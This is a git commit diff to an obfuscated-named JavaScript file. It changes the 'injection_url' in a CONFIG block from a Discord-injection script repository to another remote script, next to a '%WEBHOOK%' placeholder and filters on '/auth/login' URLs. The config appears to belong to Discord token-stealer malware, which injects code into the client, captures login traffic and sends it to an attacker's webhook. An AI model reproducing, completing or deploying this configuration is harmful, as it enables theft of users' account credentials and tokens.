8204595e65903e85bc17b6341fd9d6494166ce77
P180EwqDeRT <sk4rtysec@gmail.com>
2025-06-21 14:54:32 -0300

    Update ae6f117592b7.js

--- f9a75c19da8cdd/ae6f117592b7.js
+++ f9a75c19da8cdd/ae6f117592b7.js
@@ -12,7 +12,7 @@ const {
 
 const CONFIG = {
     webhook: "%WEBHOOK%",
-    injection_url: "https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
+    injection_url: "https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/ae6f117592b7.js",
     filters: {
         urls: [
             '/auth/login',
